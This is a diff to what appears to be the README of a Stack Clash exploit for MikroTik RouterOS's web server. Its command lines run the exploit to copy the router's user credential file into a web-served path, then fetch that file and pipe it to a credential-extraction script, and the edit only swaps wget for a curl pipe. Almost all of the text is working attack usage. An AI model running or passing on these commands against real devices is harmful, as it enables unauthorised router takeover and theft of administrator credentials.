@@ -33,8 +33,7 @@ Where:
 ```
 $ ./StackClash_x86.py 192.168.8.1 80 www_binary "cp /rw/store/user.dat /ram/winbox.idx"
 $ sleep 3 # (wait some seconds that www is restarted)
-$ wget http://192.168.8.1/winbox/index
-$ ./tools/extract_user.py index
+$ curl -s http://192.168.8.1/winbox/index | ./tools/extract_user.py -
 ```
 
 As the ROP is dynamically created, you have to extract the `www` binary from the RouterOS firmware.   
